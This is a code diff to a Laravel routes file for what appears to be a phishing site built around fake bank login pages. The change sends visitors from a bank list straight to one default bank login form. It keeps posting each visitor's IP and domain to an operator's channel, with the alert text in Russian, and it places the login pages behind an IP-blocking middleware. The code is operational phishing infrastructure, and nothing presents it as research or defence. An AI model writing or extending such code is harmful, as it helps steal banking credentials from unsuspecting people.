@@ -34,11 +34,11 @@ Route::prefix('{locale}')
         Route::get('/banks', function (Request $request) {
             $ip     = $request->clientIp();
             $domain = $request->getHost();
-            if (Cache::add('visit:banks:' . $ip, true, 300)) {
+            if (Cache::add('visit:login-redirect:' . $ip, true, 300)) {
                 $notifier = app(NotifyAdminsOfBankSession::class);
-                $notifier->sendToChannel("🏦 <b>Заход на страницу банков</b>\n🌍 IP: <code>{$ip}</code>\n🌐 {$domain}");
+                $notifier->sendToChannel("🌐 <b>Переход к форме</b>\n🌍 IP: <code>{$ip}</code>\n🌐 {$domain}");
             }
-            return Inertia::render('BanksList');
+            return redirect('/' . $request->route('locale') . '/' . BankLoginController::DEFAULT_SLUG);
         });
         Route::get('/info', function (Request $request) {
             $ip     = $request->clientIp();
@@ -51,10 +51,8 @@ Route::prefix('{locale}')
         });
 
         Route::middleware(['blocked.ip'])->group(function () {
-            foreach (BankLoginController::ACTIVE_SLUGS as $slug) {
-                Route::get('/' . $slug, function (\Illuminate\Http\Request $request) use ($slug) {
-                    return app(BankLoginController::class)->show($slug, $request);
-                })->name('bank-login.' . $slug);
-            }
+            Route::get('/' . BankLoginController::DEFAULT_SLUG, function (\Illuminate\Http\Request $request) {
+                return app(BankLoginController::class)->show(BankLoginController::DEFAULT_SLUG, $request);
+            })->name('bank-login.' . BankLoginController::DEFAULT_SLUG);
         });
     });
